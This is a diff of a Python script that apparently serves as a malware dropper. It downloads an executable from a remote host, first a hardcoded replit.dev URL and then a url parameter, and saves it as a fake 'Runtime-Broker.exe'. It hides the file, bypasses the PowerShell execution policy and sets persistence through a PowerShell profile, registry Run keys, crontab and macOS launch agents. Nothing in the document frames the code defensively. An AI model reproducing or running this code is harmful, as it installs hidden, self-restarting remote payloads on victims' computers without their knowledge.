@@ -4,7 +4,7 @@ import subprocess
 import base64
 import requests
 
-def run():
+def run(url):
     def create_hidden_file(path):
         if os.name == 'nt':  # Windows
             subprocess.run(['attrib', '+h', path])
@@ -44,29 +44,28 @@ def run():
     
     def create_powershell_profile(path, name):
         command = 'powershell -c Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser'
-        f = subprocess.run(command, shell=True)
-        print(f)
+        subprocess.run(command, shell=True)
         command = f'powershell -c New-Item $profile -Type File -Force'
         subprocess.run(command, shell=True)
         directory = f"C:\\Users\\{os.getlogin()}\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1"
         create_hidden_file(directory)
         with open(directory, 'w') as f:
             f.write("""# Define the process name you want to check
-$processName = "Runtime-Broker"
-
-# Define the path to the executable you want to run
-$exePath = '"""+path+"""'
-
-# Check if the process is running
-$process = Get-Process -Name $processName -ErrorAction SilentlyContinue
-
-if ($process) {
-} else {
+    $processName = "Runtime-Broker"
+    
+    # Define the path to the executable you want to run
+    $exePath = '"""+path+"""'
+    
+    # Check if the process is running
+    $process = Get-Process -Name $processName -ErrorAction SilentlyContinue
+    
+    if ($process) {
+    } else {
     try {
         Start-Process -FilePath $exePath
     } catch {
     }
-}""")
+    }""")
     
     def add_to_startup(path, name):
         startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
@@ -82,45 +81,45 @@ if ($process) {
         winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
         winreg.CloseKey(key)
     
-
+    
     
     os_type = platform.system()
-
-
+    
+    
     if os_type == 'Windows':
         import winreg
-
+    
         file_path = "C:\\ProgramData\\Runtime-Broker.exe"
         if not os.path.exists(file_path):
-            response = requests.get("https://1e26c3bd-d2fc-4199-8c95-28e5c4f20ff4-00-3mijlg2wczefz.riker.replit.dev/win11")
+            response = requests.get(f"{url}win11")
             with open(file_path, 'wb') as file:
               file.write(response.content)
-        # Create a hidden file, add to startup, and create a scheduled task
+                
+        create_powershell_profile(file_path, "Runtime Broker")
         create_hidden_file(file_path)
         create_hidden_file("C:\\ProgramData\\uuid.txt")
-        add_to_startup(file_path, "Runtime Broker")
-        create_powershell_profile(file_path, "Runtime Broker")
+        #add_to_startup(file_path, "Runtime Broker")
         add_registry_startup(file_path, "Runtime Broker")
-
+    
     elif os_type == 'Linux' or os_type == 'FreeBSD' or os_type == 'OpenBSD' or os_type == 'SunOS' or os_type == 'Android':
         file_path = "./test.exe"
         if not os.path.exists(file_path):
-            response = requests.get("https://1e26c3bd-d2fc-4199-8c95-28e5c4f20ff4-00-3mijlg2wczefz.riker.replit.dev/win")
+            response = requests.get(f"{url}win")
             with open(file_path, 'wb') as file:
               file.write(response.content)
         # Create a hidden file and add a crontab job
         create_hidden_file(file_path)
         add_crontab_job(file_path)
-
+    
     elif os_type == 'Darwin':  # macOS
         file_path = "./wow.exe"
         if not os.path.exists(file_path):
-            response = requests.get("https://1e26c3bd-d2fc-4199-8c95-28e5c4f20ff4-00-3mijlg2wczefz.riker.replit.dev/win")
+            response = requests.get(f"{url}win")
             with open(file_path, 'wb') as file:
               file.write(response.content)
         # Create a hidden file and add a launch agent
         create_hidden_file(file_path)
         create_launch_agent(file_path, "com.yourname.launcher")
-
+    
     else:
         print(f"Unsupported OS: {os_type}")
